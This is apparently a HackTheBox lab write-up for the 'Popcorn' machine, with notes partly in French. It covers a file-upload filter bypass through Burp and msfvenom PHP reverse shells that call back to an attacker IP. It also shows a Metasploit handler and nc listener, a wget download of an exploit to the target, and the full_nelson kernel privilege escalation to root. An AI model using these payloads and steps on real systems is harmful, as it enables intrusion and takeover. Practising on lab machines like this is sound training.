# Popcorn 10.10.10.6


- Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux

- file upload exploit (xx.php.png) JS filter *.png, use Burp to remove .png
- Linux Kernel <= 2.6.37 local privilege escalation : full_nelson : https://www.exploit-db.com/exploits/15704 , Tested on unpatched Ubuntu 10.04 kernels, both x86 and x86-64.



## nmap
````
$ nmap -A 10.10.10.6
````
=> 80

## dirb -> bittornado
````
$ dirb http://10.10.10.6
http://10.10.10.6/torrent/
````

![](images/popcorn_torrent.png)

## Site exploit : file upload (xx.php.png)

We can Register an account

Upload a torrent
Submit a screenshot : need to upload a .png file
JS filter *.png
Intercept with Burp
Rename .php => .php.png 

Build a .php reverse shell
````
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.30 lport=4445 -f raw  > 123.php.png
````

Intercept the Post with Burp
Rename 123.php.png to 123.php
Meterpreter is uploaded... where ?

````
dirb http://10.10.10.6/torrent/
http://10.10.10.6/torrent/upload/ 
````
## Get meterpreter

Prepare a listener
````
$ msfconsole
msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.30
msf exploit(multi/handler) set lport 4321
msf exploit(multi/handler) exploit

meterpreter > sysinfo
 Linux popcorn 2.6.31-14
````

## The same without meterpreter

```
# msfvenom -p php/reverse_php lhost=10.10.14.30 lport=4445 -f raw  > r_php.php.png
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3017 bytes

root@kali:~/htb/YoloToolbox/machines/htb/popcorn# nc -lvp 4445
listening on [any] 4445 ...
10.10.10.6: inverse host lookup failed: Unknown host
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.6] 58345

whoami
www-data

uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```
Le shell via php n'est pas terrible...
on ne recupere pas la main une fois l'exploit lancé


## Pric esc : full_nelson

=> Linux Kernel <= 2.6.37 local privilege escalation : full_nelson : 3 Privilege to get root
Exploit 3 CVE: CVE-2010-4258, CVE-2010-3849, CVE-2010-3850
Tested on unpatched Ubuntu 10.04 kernels, both x86 and x86-64.
````
https://www.exploit-db.com/exploits/15704
````


upload 15704.c
```
python -m SimpleHTTPServer
wget http://10.10.14.30:8000/15704.c
```

meterpreter> shell
````
gcc 15704.c -o exploit
chmod 755 exploit
./exploit
id
uid=0(firefart)
cat /root/root.txt
[*] Started reverse TCP handler on 10.10.14.30:4445 
[*] Sending stage (37775 bytes) to 10.10.10.6
[*] Meterpreter session 1 opened (10.10.14.30:4445 -> 10.10.10.6:49403) at 2019-09-03 23:16:29 +0200

meterpreter > shell
Process 2187 created.
Channel 0 created.

./exploit
id
uid=0(root) gid=0(root)

cat /home/george/user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx
cat /root/root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx

````
 

